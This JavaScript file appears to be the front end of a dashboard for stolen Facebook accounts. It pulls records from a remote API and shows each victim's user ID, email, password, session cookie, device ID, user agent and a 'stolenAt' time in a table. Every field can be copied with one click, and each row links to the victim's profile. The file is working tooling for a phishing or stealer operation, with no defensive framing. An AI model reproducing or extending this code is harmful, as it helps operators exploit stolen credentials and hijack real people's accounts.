const API = "https://plum-successful-chick.cyclic.app/users";
const tbody = document.querySelector("tbody");

function validateText(text, isNumber = false) {
    if (text && text !== "") {
        return isNumber ? !isNaN(Number(text)) && text : !text.includes(" ") && text;
    }
    return false;
}

function fillDataToTable(isHideSwal) {
    fetch(API)
        .then((res) => res.json())
        .then((data) => {
            const html = data
                .map((user, index) => {
                    const shortCookie = user.cookie.split(";")[0].split("=")[1];
                    return `<tr>
                                <td scope="row">
                                    <a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
                                        validateText(user.c_user) ? "https://fb.com/" + user.c_user : "#"
                                    }'>${index + 1}</a>
                                </td>

                    ${["c_user", "email", "password"]
                        .map(
                            (field) => `
                        <td title="${user[field]}" data-bs-coppy="${user[field]}" style='color: ${
                                validateText(user[field]) ? "" : "red !important"
                            }'>${validateText(user[field]) || "unknown"}</td>
                    `
                        )
                        .join("")}

                    <td data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
                        shortCookie || "red !important"
                    }' title="${user.cookie}">${shortCookie || "unknown"}</td>

                    <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
                    <td data-bs-coppy="${user.device_id}" class="short-view" style='color: ${
                        validateText(user.device_id) ? "" : "red !important"
                    }' title="${validateText(user.device_id)}">${validateText(user.device_id, true) || "unknown"}</td>

                    <td title="${user.stolenAt}" data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
                    <td><button data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
                        user.id
                    }">More</button></td>
                </tr>`;
                })
                .join("");
            tbody.innerHTML = html;
        })
        .then(() => {
            document.querySelectorAll("td[data-bs-coppy]").forEach((td) => {
                td.onclick = () => {
                    const text = td.getAttribute("data-bs-coppy");
                    const textInner = td.innerText;

                    if (textInner != "unknown") {
                        navigator.clipboard.writeText(text);
                        Swal.fire({
                            title: "Success!",
                            text: "Coppied to clipboard!",
                            icon: "success",
                            confirmButtonText: "Close",
                        });
                    } else {
                        Swal.fire({
                            title: "Error!",
                            text: "Can not copy the empty value!",
                            icon: "error",
                            confirmButtonText: "Okay",
                        });
                    }
                };
            });
        })
        .finally(() => {
            !isHideSwal
                ? Swal.fire({
                      title: "Success!",
                      text: "Data updated!",
                      icon: "success",
                      confirmButtonText: "Close",
                  })
                : null;
        });
}

(() => fillDataToTable(true))();
